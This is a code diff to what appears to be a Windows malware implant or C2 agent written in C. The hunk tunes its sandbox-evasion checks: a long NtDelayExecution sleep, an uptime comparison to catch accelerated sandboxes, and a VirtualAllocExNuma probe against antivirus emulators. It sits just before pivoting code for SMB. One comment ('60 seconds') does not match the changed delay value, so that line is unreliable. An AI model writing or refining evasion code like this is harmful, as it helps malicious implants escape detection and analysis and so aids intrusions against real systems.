@@ -514,14 +514,15 @@ int Entry() {
     PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
     LARGE_INTEGER delay;
     PVOID m = NULL;
-    delay.QuadPart = -600 * 100000; // 60 seconds
+    delay.QuadPart = -6000 * 100000; // 60 seconds
     pNtDelayExecution(FALSE, &delay);
     ULONGLONG uptimeAfterSleep = GetTickCount64();
-    if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
+    if ((uptimeAfterSleep - uptimeBeforeSleep) < 60000) return false;
 
     m = VirtualAllocExNuma(GetCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0);
     if (m == NULL)
         return 0;
+    VirtualFreeEx(GetCurrentProcess(), m, 0, MEM_RELEASE);
 #endif
 #ifdef  PIVOT
 #ifdef SMBPIVOT
